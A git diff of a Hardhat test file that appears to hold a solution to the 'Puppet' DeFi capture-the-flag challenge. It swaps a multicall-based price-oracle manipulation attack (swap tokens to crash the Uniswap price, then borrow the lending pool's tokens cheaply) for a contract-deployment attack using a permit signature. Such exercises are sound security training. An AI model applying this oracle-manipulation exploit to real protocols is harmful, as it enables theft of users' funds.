@@ -111,11 +111,10 @@ describe('[Challenge] Puppet', function () {
         /** CODE YOUR SOLUTION HERE */
         async function attackWithContract() {
             const chainId = (await ethers.provider.getNetwork()).chainId
-            const nonce = await ethers.provider.getTransactionCount(player.address)
 
             const attackContractAddress = ethers.utils.getContractAddress({
                 from: player.address,
-                nonce
+                nonce: 0
             })
 
             const domain = {
@@ -137,7 +136,7 @@ describe('[Challenge] Puppet', function () {
                 owner: player.address,
                 spender: attackContractAddress,
                 value: PLAYER_INITIAL_TOKEN_BALANCE,
-                nonce,
+                nonce: 0,
                 deadline: ethers.constants.MaxUint256
             }
 
@@ -167,60 +166,11 @@ describe('[Challenge] Puppet', function () {
             await player.sendTransaction({
                 to: null,
                 data,
-                value: (PLAYER_INITIAL_ETH_BALANCE * 9n) / 10n
+                value: ethers.utils.parseEther('20'),
+                gasLimit: 30000000n
             })
         }
-        async function attackWithMulticall() {
-            const multicall = await (
-                await ethers.getContractFactory('Multicall3', deployer)
-            ).deploy()
-
-            // approve
-            const approveTx = {
-                target: token.address,
-                allowFailure: 0,
-                value: 0,
-                callData: token.interface.encodeFunctionData('approve', [
-                    uniswapExchange.address,
-                    ethers.constants.MaxUint256
-                ])
-            }
-
-            //swap
-            const swapTx = {
-                target: uniswapExchange.address,
-                allowFailure: 1,
-                value: 0,
-                callData: uniswapExchange.interface.encodeFunctionData(
-                    'tokenToEthSwapInput',
-                    [PLAYER_INITIAL_TOKEN_BALANCE, 1n, ethers.constants.MaxUint256]
-                )
-            }
-            //borrow
-            const borrowTx = {
-                target: lendingPool.address,
-                allowFailure: 0,
-                value: (PLAYER_INITIAL_ETH_BALANCE * 9n) / 10n,
-                callData: lendingPool.interface.encodeFunctionData('borrow', [
-                    POOL_INITIAL_TOKEN_BALANCE,
-                    player.address
-                ])
-            }
-            //multicall
-
-            const execute = {
-                to: multicall.address,
-                data: multicall.interface.encodeFunctionData('aggregate3Value', [
-                    [approveTx, swapTx, borrowTx]
-                ]),
-                gasLimit: 3 * 10 ** 7,
-                value: (PLAYER_INITIAL_ETH_BALANCE * 9n) / 10n
-            }
-
-            await player.sendTransaction(execute)
-        }
-
-        await attackWithMulticall()
+        await attackWithContract()
     })
 
     after(async function () {
